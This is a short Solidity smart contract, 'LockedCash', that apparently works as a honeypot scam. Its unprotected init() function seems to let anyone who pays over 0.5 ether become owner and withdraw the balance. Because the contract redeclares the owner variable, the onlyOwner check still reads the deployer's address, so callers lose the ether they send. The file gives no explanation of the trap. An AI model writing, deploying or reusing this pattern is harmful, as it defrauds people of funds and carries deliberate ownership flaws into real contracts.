1 pragma solidity ^0.4.18;
2 
3 contract Owned {
4     address public owner;
5     function Owned() { owner = msg.sender; }
6     modifier onlyOwner{ if (msg.sender != owner) revert(); _; }
7 }
8 
9 contract LockedCash is Owned {
10     event CashDeposit(address from, uint amount);
11     address public owner = msg.sender;
12 
13     function init() payable {
14         require(msg.value > 0.5 ether);
15         owner = msg.sender;
16     }
17 
18     function() public payable {
19         deposit();
20     }
21 
22     function deposit() public payable {
23         require(msg.value > 0);
24         CashDeposit(msg.sender, msg.value);
25     }
26 
27     function withdraw(uint amount) public onlyOwner {
28         require(amount <= this.balance);
29         msg.sender.transfer(amount);
30     }
31 }